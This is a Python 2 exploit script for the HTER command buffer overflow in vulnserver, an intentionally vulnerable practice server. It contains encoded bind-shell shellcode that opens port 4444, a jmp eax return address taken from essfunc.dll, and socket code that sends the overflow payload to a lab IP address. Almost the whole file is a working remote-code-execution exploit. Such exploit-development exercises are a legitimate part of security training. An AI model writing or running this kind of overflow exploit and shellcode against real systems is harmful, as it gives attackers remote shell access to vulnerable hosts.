#!/usr/bin/python -w
##################################################################################################################
# Author: Tiago Carvalho 
# vulnserver hter Overflow
# buffer size 2048
# EIP OVERRIDE 2040
# Beguining of the buffer EAX
##################################################################################################################

from struct import pack
import socket
import sys

IP="172.16.206.132"

##########################################################################################################################
# Bind shell port 4444 
# x86/shikata_ga_nai succeeded with size 355 (iteration=0)
##########################################################################################################################

shellcode = (
"90505C90909090909090"
"bd7914cde0dadfd97424f45b29c9b1"
"5383c304316b0e03121a2f1518ca2d"
"d6e00b525e053a52044e6d624e0282"
"0902b6117f8bb992caedf42366cd97"
"a775027799b55776dea89a2ab7a709"
"dabcf291518e1392864715b319d34c"
"139830e51a8255c0d539adbee7ebff"
"3f4bd2cfcd9513f72de06d0bd3f3aa"
"710f7128d1c42194e309b75fefe6b3"
"07ecf9103c0871979298c1bc36c092"
"dd6fac75e16f0f2947e4a23efaa7aa"
"f337572b9c40241903fba211cc2535"
"55e792a9a808e3e06e5cb39a47dd58"
"5a6708f452cee3eb9fb053ac0f59be"
"237079c1e919123c1234bfc9f45c2f"
"9cafc88dfb676fed29d007a63be728"
"376e4fbebc7d4bdfc2abfb8855216a"
"fbc436a76b64a42c6be3d5fa3ca428"
"f3a85812adcea0c2964a7f371853f2"
"033e43ca8c7a3782dad4e164b5965b"
"3f6a710bc640424dc78c34b1767901"
"ceb7ed85b7a58d6a626ebd202ec756"
"edbb553b0e1699428d9262b18dd767"
"fd09041a6efc2a898fd5")

##################################################################################################################
# Log data, item 24
# Address: 625011B1
# Instruction: jmp eax 
# {PAGE_EXECUTE_READ} [essfunc.dll] v-1.0- (C:\sully\sulley\essfunc.dll)
# ASLR: False, Rebase: False, SafeSEH: False, OS: False
# [nop][stack adjustment][shellcode][junk][jm eax]
##################################################################################################################
jmp = pack("<L", 0x625011B1).encode("hex")

payload = shellcode + "A" * (2040 - len(shellcode)) + jmp

print "[*]\tPayload Size:\t%d" % len(payload)

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect((IP, 8888))

s.send("HTER 0"+ payload + "\r\n")
s.close